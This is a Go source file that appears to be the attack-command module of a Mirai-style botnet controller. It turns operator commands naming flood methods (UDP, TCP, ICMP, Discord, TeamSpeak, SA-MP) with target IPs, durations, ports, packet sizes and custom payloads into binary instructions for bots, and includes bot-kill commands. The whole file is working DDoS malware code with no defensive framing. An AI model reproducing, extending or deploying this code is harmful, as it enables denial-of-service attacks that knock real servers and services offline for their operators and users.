package main

import (
	"encoding/binary"
	"encoding/hex"
	"errors"
	"net"
	"strconv"
	"strings"
)

type AttackInfo struct {
	attackID          uint8
	attackFlags       []uint8
	attackDescription string
}

type Attack struct {
	Duration uint32
	Type     uint8
	Targets  map[uint32]uint8
	Flags    map[uint8]string
}

type PayloadFlag struct {
	ID      uint8
	Length  uint8
	Payload []byte
}

func NewAttack(str string, admin int) (*Attack, error) {
	atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
	args := strings.Split(str, " ")

	if args[0] == "killbot" {
		atk.Type = 15
		atk.Duration = 0
		target := "255.255.255.255"
		prefix := binary.BigEndian.Uint32(net.ParseIP(target).To4())
		atk.Targets[prefix] = 32
		return atk, nil
	}
	
	if args[0] == "killport" {
		atk.Type = 16
		atk.Duration = 0
		
		ip := net.ParseIP("255.255.255.255").To4()
		if ip != nil {
			prefix := binary.BigEndian.Uint32(ip)
			atk.Targets[prefix] = 32
		}
		
		return atk, nil
	}

	if len(args) < 3 {
		return nil, errors.New("Not enough arguments")
	}

	var method uint8
	switch args[0] {
	case "udp-x":
		method = 1
	case "udppay":
		method = 7
	case "samp-x":
		method = 2
	case "pps-x":
		method = 3
	case "discord":
		method = 4
	case "nudp-x":
		method = 5
	case "ts3-x":
		method = 6
	case "tcp-x":
		method = 0
	case "tcp-rand":
		method = 11
	case "ntcp-x":
		method = 12
	case "icmp-x":
		method = 13
	case "kill":
		method = 15
	case "up":
		method = 16
	default:
		return nil, errors.New("Unknown attack method")
	}

	duration, err := strconv.Atoi(args[2])
	if err != nil {
		return nil, errors.New("Failed to parse duration")
	}

	target := args[1]
	prefix := binary.BigEndian.Uint32(net.ParseIP(target).To4())
	atk.Targets[prefix] = 32

	atk.Duration = uint32(duration)
	atk.Type = method

	for i := 3; i < len(args); i++ {
		flagSplit := strings.SplitN(args[i], "=", 2)
		if len(flagSplit) != 2 {
			continue
		}

		switch flagSplit[0] {
		case "port":
			atk.Flags[7] = flagSplit[1]
		case "size":
			atk.Flags[0] = flagSplit[1]
		case "conns":
			atk.Flags[24] = flagSplit[1]
		case "payload":
			payload := parseHexString(flagSplit[1])
			if len(payload) > 0 {
				atk.Flags[8] = string(payload)
			}
		}
	}

	return atk, nil
}

func (this *Attack) Build() ([]byte, error) {
	buf := make([]byte, 0)
	var tmp []byte

	tmp = make([]byte, 4)
	binary.BigEndian.PutUint32(tmp, this.Duration)
	buf = append(buf, tmp...)

	buf = append(buf, byte(this.Type))

	buf = append(buf, byte(len(this.Targets)))

	for prefix, netmask := range this.Targets {
		tmp = make([]byte, 5)
		binary.BigEndian.PutUint32(tmp, prefix)
		tmp[4] = byte(netmask)
		buf = append(buf, tmp...)
	}

	buf = append(buf, byte(len(this.Flags)))

	for key, val := range this.Flags {
		tmp = make([]byte, 2)
		tmp[0] = key
		strbuf := []byte(val)
		if len(strbuf) > 255 {
			return nil, errors.New("Flag value cannot be more than 255 bytes!")
		}
		tmp[1] = uint8(len(strbuf))
		tmp = append(tmp, strbuf...)
		buf = append(buf, tmp...)
	}

	if len(buf) > 4096 {
		return nil, errors.New("Max buffer is 4096")
	}
	tmp = make([]byte, 2)
	binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
	buf = append(tmp, buf...)

	return buf, nil
}

func parseHexString(s string) []byte {
	s = strings.ReplaceAll(s, "\\x", "")
	s = strings.ReplaceAll(s, " ", "")

	decoded, err := hex.DecodeString(s)
	if err != nil {
		return nil
	}
	return decoded
}
